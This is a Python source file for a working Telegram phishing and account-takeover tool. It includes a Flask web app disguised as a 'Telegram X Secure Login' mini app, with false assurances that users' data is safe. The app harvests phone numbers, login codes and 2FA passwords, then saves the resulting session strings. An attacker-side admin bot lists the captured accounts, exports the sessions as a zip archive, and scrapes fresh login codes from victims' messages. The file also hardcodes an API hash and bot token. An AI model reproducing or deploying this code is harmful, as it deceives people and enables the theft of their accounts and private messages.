#!/usr/bin/env python3
import os
import sys
import asyncio
import logging
import json
import re
import time
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

# ============================================================
# КОНФИГ
# ============================================================
API_ID = 37803152
API_HASH = "5d34acaeda36aa1a308e40ae31668795"
BOT_TOKEN = "8690036172:AAGj9YweZMAdEm4tI5YTKJs_n1oAB-BN78c"
ADMIN_IDS = [8866175391]
BASE_URL = "https://hackacc.onrender.com"

# ============================================================
# НАСТРОЙКА
# ============================================================
os.makedirs("sessions/valid", exist_ok=True)
os.makedirs("data", exist_ok=True)
os.makedirs("logs", exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/app.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================================
# БАЗА ДАННЫХ
# ============================================================
DB_PATH = "data/db.json"

def load_db():
    if os.path.exists(DB_PATH):
        with open(DB_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"sessions": {}, "stats": {"total": 0, "valid": 0, "invalid": 0}}

def save_db(db):
    with open(DB_PATH, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)

db = load_db()

def get_stats():
    stats = db.get("stats", {"total": 0, "valid": 0, "invalid": 0})
    stats["total"] = len(db["sessions"])
    stats["valid"] = sum(1 for s in db["sessions"].values() if s.get("valid", False))
    stats["invalid"] = stats["total"] - stats["valid"]
    return stats

def save_session(phone: str, session_string: str):
    filename = f"session_{phone.replace('+', '').replace(' ', '')}.session"
    filepath = os.path.join("sessions/valid", filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(session_string)
    db["sessions"][phone] = {
        "phone": phone,
        "file": filename,
        "created_at": datetime.now().isoformat(),
        "valid": True
    }
    save_db(db)
    logger.info(f"✅ Session saved: {phone}")
    return True

def get_valid_sessions():
    return [
        {"phone": p, "file": d.get("file", ""), "created_at": d.get("created_at", "")}
        for p, d in db["sessions"].items()
        if d.get("valid", False)
    ]

def get_session_file(phone: str):
    data = db["sessions"].get(phone)
    if not data or not data.get("valid", False):
        return None
    filepath = os.path.join("sessions/valid", data.get("file", ""))
    if not os.path.exists(filepath):
        return None
    with open(filepath, "r", encoding="utf-8") as f:
        return f.read().strip()

# ============================================================
# MINI APP HTML — С СООБЩЕНИЕМ ПРО БЕЗОПАСНОСТЬ
# ============================================================
MINI_APP_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram X</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0f0f1a; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { max-width: 380px; width: 100%; background: #1a1a2e; border-radius: 16px; padding: 30px 24px; }
        h2 { text-align: center; color: #0088cc; margin-bottom: 6px; }
        .subtitle { text-align: center; color: #666; font-size: 13px; margin-bottom: 20px; }
        .info-text {
            background: rgba(0, 136, 204, 0.08);
            border-left: 3px solid #0088cc;
            padding: 12px 14px;
            margin-bottom: 20px;
            border-radius: 6px;
            font-size: 13px;
            color: #aaa;
            line-height: 1.7;
        }
        .info-text strong { color: #0088cc; }
        .info-text .heart { color: #ff4757; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 10px; background: #2a2a3e; color: #fff; font-size: 16px; outline: none; }
        input:focus { border: 2px solid #0088cc; }
        button { width: 100%; padding: 14px; margin-top: 16px; border: none; border-radius: 10px; background: #0088cc; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #0099dd; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .message { margin-top: 16px; padding: 12px; border-radius: 8px; text-align: center; display: none; font-size: 14px; }
        .success { background: rgba(76,175,80,0.2); color: #4caf50; border: 1px solid #4caf50; display: block; }
        .error { background: rgba(229,62,62,0.2); color: #e53e3e; border: 1px solid #e53e3e; display: block; }
        .info { background: rgba(0,136,204,0.2); color: #0088cc; border: 1px solid #0088cc; display: block; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Telegram X</h2>
        <div class="subtitle">Secure Login</div>

        <div class="info-text">
            <strong>Why sign in via Telegram?</strong><br>
            Because it is secure and very fast, all your data is encrypted and they are safe.<br>
            We take care of our customers. <span class="heart">❤️</span>
        </div>

        <input type="tel" id="phone" placeholder="+7 999 123-45-67">
        <div id="codeSection" class="hidden">
            <input type="text" id="code" placeholder="Code from Telegram">
            <input type="password" id="password" placeholder="2FA password (if needed)" class="hidden">
        </div>
        <button id="submitBtn">Sign In</button>
        <div id="message" class="message"></div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        if (tg) tg.expand();
        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');
        const passwordInput = document.getElementById('password');
        const codeSection = document.getElementById('codeSection');
        const submitBtn = document.getElementById('submitBtn');
        const messageEl = document.getElementById('message');
        let step = 'phone';
        let currentPhone = '';

        function showMessage(text, type) {
            messageEl.textContent = text;
            messageEl.className = 'message ' + type;
        }

        submitBtn.addEventListener('click', async function() {
            if (step === 'phone') {
                const rawPhone = phoneInput.value.replace(/\\D/g, '');
                if (rawPhone.length < 10) {
                    showMessage('Invalid phone number (need 10+ digits)', 'error');
                    return;
                }
                currentPhone = '+' + rawPhone;
                showMessage('Sending code...', 'info');
                submitBtn.disabled = true;
                try {
                    const resp = await fetch('/api/auth/send', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone: currentPhone})
                    });
                    const data = await resp.json();
                    if (data.status === 'ok') {
                        step = 'code';
                        codeSection.classList.remove('hidden');
                        showMessage('Code sent! Check Telegram', 'success');
                        codeInput.focus();
                    } else {
                        showMessage(data.message || 'Error', 'error');
                    }
                } catch (err) {
                    showMessage('Connection error', 'error');
                }
                submitBtn.disabled = false;
                return;
            }

            if (step === 'code') {
                const code = codeInput.value.trim();
                if (!code) { showMessage('Enter code', 'error'); return; }
                const password = passwordInput.value.trim();
                showMessage('Verifying...', 'info');
                submitBtn.disabled = true;
                try {
                    const resp = await fetch('/api/auth/verify', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            phone: currentPhone,
                            code: code,
                            password: password || undefined
                        })
                    });
                    const data = await resp.json();
                    if (data.status === 'ok') {
                        showMessage('✅ Access granted!', 'success');
                        submitBtn.textContent = '✅ Logged In';
                        submitBtn.disabled = true;
                        if (tg) tg.showAlert('Access granted!');
                    } else if (data.message && data.message.includes('2FA')) {
                        passwordInput.classList.remove('hidden');
                        showMessage('Enter 2FA password', 'info');
                        passwordInput.focus();
                    } else {
                        showMessage(data.message || 'Error', 'error');
                    }
                } catch (err) {
                    showMessage('Connection error', 'error');
                }
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
"""

# ============================================================
# FLASK
# ============================================================
app = Flask(__name__)
pending_auth = {}
rate_limiter = {}

def check_rate_limit(ip: str) -> bool:
    now = time.time()
    if ip in rate_limiter:
        if now - rate_limiter[ip] < 2.0:
            return False
    rate_limiter[ip] = now
    return True

@app.route("/")
def index():
    return render_template_string(MINI_APP_HTML)

@app.route("/api/auth/send", methods=["POST"])
def send_code():
    data = request.json
    ip = request.remote_addr
    if not check_rate_limit(ip):
        return jsonify({"status": "error", "message": "Too many attempts"}), 429
    phone = data.get("phone", "").strip()
    if not phone or len(phone) < 10:
        return jsonify({"status": "error", "message": "Invalid phone"}), 400
    logger.info(f"Sending code to {phone}")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone)
            pending_auth[phone] = {"client": client}
            return {"status": "ok", "message": "Code sent"}
        except Exception as e:
            logger.error(f"Send error: {e}")
            return {"status": "error", "message": str(e)}
    result = loop.run_until_complete(send())
    loop.close()
    return jsonify(result)

@app.route("/api/auth/verify", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone", "").strip()
    code = data.get("code", "").strip()
    password = data.get("password", "").strip()
    if not phone or not code:
        return jsonify({"status": "error", "message": "Fill all fields"}), 400
    if phone not in pending_auth:
        return jsonify({"status": "error", "message": "Request code first"}), 400
    logger.info(f"Verifying code for {phone}")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def verify():
        client = pending_auth[phone].get("client")
        if not client:
            return {"status": "error", "message": "Client not found"}
        try:
            await client.sign_in(phone, code)
            if password:
                await client.sign_in(password=password)
            if await client.is_user_authorized():
                me = await client.get_me()
                session_string = client.session.save()
                save_session(phone, session_string)
                del pending_auth[phone]
                return {"status": "ok", "message": "Access granted", "user": {"id": me.id, "username": me.username}}
            return {"status": "error", "message": "Auth failed"}
        except Exception as e:
            if "2FA" in str(e) or "password" in str(e):
                return {"status": "error", "message": "2FA required"}
            logger.error(f"Verify error: {e}")
            return {"status": "error", "message": str(e)}
    result = loop.run_until_complete(verify())
    loop.close()
    return jsonify(result)

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

# ============================================================
# АДМИН-БОТ
# ============================================================
class AdminBot:
    def __init__(self):
        self.client = TelegramClient("admin_bot", API_ID, API_HASH)

    async def start(self):
        await self.client.start(bot_token=BOT_TOKEN)
        logger.info("✅ Admin bot started!")

        @self.client.on(events.NewMessage(pattern="/start"))
        async def start_cmd(event):
            await event.respond(
                f"👋 Welcome!\n\n"
                f"🔗 Mini App: {BASE_URL}\n"
                f"📱 Open your Mini App by clicking the link above.\n\n"
                f"Commands:\n"
                f"/admin - Admin panel\n"
                f"/accounts - Show all accounts\n"
                f"/stats - Statistics\n"
                f"/export - Export sessions\n"
                f"Send a phone number (e.g. +79991234567) to get its code"
            )

        @self.client.on(events.NewMessage(pattern="/admin"))
        async def admin_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ Access denied")
                return
            stats = get_stats()
            await event.respond(
                f"🔐 Admin Panel\n\n"
                f"📊 Statistics:\n"
                f"├ Total: {stats.get('total', 0)}\n"
                f"├ ✅ Valid: {stats.get('valid', 0)}\n"
                f"└ ❌ Invalid: {stats.get('invalid', 0)}\n\n"
                f"Commands:\n"
                f"/accounts - show all accounts\n"
                f"/stats - show statistics\n"
                f"/export - export sessions\n"
                f"Send phone number to get code"
            )

        @self.client.on(events.NewMessage(pattern="/accounts"))
        async def accounts_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                return
            accounts = get_valid_sessions()
            if not accounts:
                await event.respond("📭 No valid accounts")
                return
            text = "📱 Valid Accounts:\n\n"
            for idx, acc in enumerate(accounts):
                phone = acc.get("phone", "Unknown")
                created = acc.get("created_at", "")[:10]
                text += f"{idx+1}. 📱 {phone} | 📅 {created}\n"
            text += "\nSend a phone number (e.g., +79991234567) to get its code"
            await event.respond(text)

        @self.client.on(events.NewMessage(pattern="/stats"))
        async def stats_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                return
            stats = get_stats()
            await event.respond(
                f"📊 Statistics:\n\n"
                f"├ Total: {stats.get('total', 0)}\n"
                f"├ ✅ Valid: {stats.get('valid', 0)}\n"
                f"└ ❌ Invalid: {stats.get('invalid', 0)}"
            )

        @self.client.on(events.NewMessage(pattern="/export"))
        async def export_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                return
            accounts = get_valid_sessions()
            if not accounts:
                await event.respond("📭 No sessions to export")
                return
            await event.respond("⏳ Creating archive...")
            import zipfile, io
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                for acc in accounts:
                    phone = acc.get("phone", "unknown")
                    session_string = get_session_file(phone)
                    if session_string:
                        zf.writestr(f"{phone.replace('+', '')}.session", session_string)
            zip_buffer.seek(0)
            await self.client.send_file(
                event.sender_id,
                zip_buffer,
                file_name=f"sessions_{datetime.now().strftime('%Y%m%d_%H%M')}.zip",
                caption=f"📦 Sessions: {len(accounts)}"
            )
            await event.respond("✅ Archive sent")

        # ===== ОБРАБОТКА НОМЕРА ДЛЯ ПОЛУЧЕНИЯ КОДА =====
        @self.client.on(events.NewMessage)
        async def message_handler(event):
            if event.sender_id not in ADMIN_IDS:
                return
            text = event.raw_text.strip()
            # Проверяем, что это номер телефона
            if text.startswith("+") and len(text) > 10 and text[1:].replace(" ", "").isdigit():
                phone = text
                # Ищем код для этого номера
                code_file = f"data/codes_{phone.replace('+', '').replace(' ', '')}.txt"
                if os.path.exists(code_file):
                    with open(code_file, "r", encoding="utf-8") as f:
                        lines = f.readlines()
                        if lines:
                            last = lines[-1].strip()
                            await event.respond(f"🔑 Last code for {phone}:\n{last}")
                            return
                # Если нет сохранённого кода — пробуем найти в сессии
                session_string = get_session_file(phone)
                if session_string:
                    try:
                        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
                        await client.connect()
                        if await client.is_user_authorized():
                            # Ищем в последних сообщениях
                            async for msg in client.iter_messages(limit=20):
                                if msg.text:
                                    codes = re.findall(r'\b(\d{5,6})\b', msg.text)
                                    if codes:
                                        await event.respond(f"🔑 Found code in messages:\n{codes}")
                                        return
                        await client.disconnect()
                    except Exception as e:
                        logger.error(f"Code search error: {e}")
                await event.respond(f"❌ No code found for {phone}")

        await self.client.run_until_disconnected()

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    bot = AdminBot()
    
    def run_bot():
        asyncio.run(bot.start())
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    time.sleep(2)
    logger.info("🚀 Starting Flask server...")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)